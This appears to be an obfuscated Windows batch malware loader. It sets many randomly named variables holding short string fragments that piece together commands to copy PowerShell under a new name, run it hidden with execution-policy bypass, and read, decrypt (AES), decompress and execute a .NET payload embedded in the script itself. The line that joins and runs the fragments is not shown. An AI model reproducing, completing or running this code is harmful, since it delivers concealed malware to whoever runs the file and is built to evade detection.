@echo off
set "DqmRGYjYnN=ow"
set "kohbkJwsvB=0\"
set "WKKUmYqIxI=1."
set "WzBiFQUMPo=y "
set "trCGdZeaaS=st"
set "BognEbjcPH=s\"
set "nsVdNYiHkZ=we"
set "prSHRmojFe=Wi"
set "EbiYOohuhY=he"
set "YjWKQZRNlm=Po"
set "ZTvemHVvQK=he"
set "LowiHmkXoy=xe"
set "CYPtkdchdq=rS"
set "QSfGJAHNKQ=do"
set "iTKPWnElVg=32"
set "JTCxYIfuEN=ll"
set "ROAmdTcLBK= /"
set "XHCqModRol=po"
set "szfwcuoJVU=py"
set "VztluRtdnl=ll"
set "sEiqidGsLX=co"
set "YqLbVAZutS=Sy"
set "sbJHTnzqgT= C"
set "YQuUNrVAwV=nd"
set "cpWRDKJgpM=em"
set "qtphjoSZCH=:\"
set "uTfUTnJBxt=ws"
set "swXWCpDOug=rs"
set "ZOFvujLAkF=\W"
set "WibWEJuTyl=in"
set "BOhviAKGNw=.e"
set "SLNKpgJYLT=we"
set "ELQEQatDzM=\v"
set "nOWfEyUUyG=cd"
set "SKaZBczKor= %~dp0"
set "IcoDGycZTG=Obje"
set "qfyZBklePy=.Mem"
set "dratTMXhrz=-joi"
set "jnORFpJOHH=FIz "
set "mzHczEbabz=e = "
set "WjtSZsYNux=rtS4"
set "jtMrWeVUhu=$QJe"
set "OdoNlVCkzG= [Sy"
set "lEegnmOEPD=);$m"
set "ckatQNVrSV= if "
set "MrOUdXJmBq=.Dis"
set "nfirphepqe=($bD"
set "PalXMeDaLp=O.Me"
set "mwzHvXaroQ='[-1"
set "LeTfXKsSwG=sGUc"
set "WzFaIAJmsR=$Taq"
set "NuWzqaPEHf=ment"
set "IBdvIxgqnn=File"
set "jSiRFWDwXL=TllA"
set "twFQsWAVng=hy.A"
set "amdclCXVDP=ddin"
set "blbNhjbXzw=;$QJ"
set "BxWVGmRlEj=pOg."
set "FbzTpHJxvE=EnQF"
set "VtCGHHeqMR=e]::"
set "NcYCbpXtnx=..-1"
set "dgYvdgfmkE=Comp"
set "QvfltplXZj=oL'["
set "AusQfnSaVx=raph"
set "YdXmZnlQme=();$"
set "QUuudcVlWy=flec"
set "iwSXMjshPT=GYRN"
set "TlUkhgugja=Invo"
set "FtvcPxOPiA=ose("
set "REEZDcitCT=-nop"
set "VbhVzJkTTa=]::N"
set "jhkldlzcEs=.Cre"
set "JGuIugWwxT= '')"
set "JRQIeLDpsG=morF"
set "VeGNPSUVRm=-joi"
set "psIaCLAoki=EnQF"
set "cOZBWcXRpy=zpOg"
set "sPzNBPAEyp=ecry"
set "hQfaeQbkRX=tS46"
set "yUmQpGDXZP=yTo("
set "LHGGYiRFsH=m.IO"
set "riEaDxiLnW=)))"
set "FGvsQniVDz=esaB"
set "iRInZXCDYe=KL);"
set "FqAwKZUaxu=m.Re"
set "wZADGUhbPv=y.Cr"
set "FozuDOTQyI=);$T"
set "jNRfJlMopA===')"
set "XzYwBusCzX=).Sp"
set "PzTDGEUVCA=am;$"
set "MNtumWFCap=tYV."
set "hnfiHCysha=] -j"
set "cmUMmMkxgM=('%~f0'"
set "xzhgLFnPxk=bypa"
set "WnEjakHYhZ=iron"
set "dZIMNmZHwI=.-16"
set "hJQyNjImkG=EnQF"
set "DXRJaBNVLn=Mode"
set "OcDEiqaOWM=[IO."
set "XBuEJmFese=WP ="
set "szojoWHppZ=Conv"
set "bnJgTaKVWT=oArr"
set "STAuzerkwz=New-"
set "MJejHVrgYX=;$Hf"
set "TBdFYMZmoM=pose"
set "nATBizgUgi=]::("
set "qbRoNnamhS=stem"
set "eGfUcYmAfK=.Ass"
set "pamNHjZGgK== $c"
set "riDTgJqUyp=ct S"
set "eOxcJgpYXg=brea"
set "QjwKcUMhJm=();$"
set "HSjGDhbOIV=[]] "
set "eVTaPKDXSF=embl"
set "mnpfDAcUIH=[Env"
set "HnIoBsmoPc=S46e"
set "WqINKcerXg=y.Ci"
set "qemIKvoHNb=Bmor"
set "BTJanxuKwk=z.En"
set "lEHbBecsAM=ss -"
set "CSpEbsMHmw=736u"
set "mbIZHaMbit=yste"
set "KeMtEoVztq=pStr"
set "tZvIoPLthz=$vEu"
set "SKBRZTaaOX=.GZi"
set "MmRKrjKMYF=1] -"
set "TRSEIOtxdP=.Cry"
set "BfVoegcsmX=yste"
set "VkJupTLVmO='gni"
set "zTbqwSqPOC=ne);"
set "YazkfHGngg=pher"
set "dssrSvGWNU=m(, "
set "fUlSLqIOvx=]::("
set "uhtKixnnLR=trea"
set "iLoAlnWPAK=KDEj"
set "jVhFXJlSsv=ke($"
set "WvByksJanl=nage"
set "zkmRxlcVVD=ode]"
set "sSwEpPJaoN=.Cry"
set "OCJMUnBAMB=eam("
set "sbrYKvbKRn=ress"
set "ZnCQBkLGQj=R, 0"
set "pqXINmVhAH=ionM"
set "tlZaVswGyz=;$Hf"
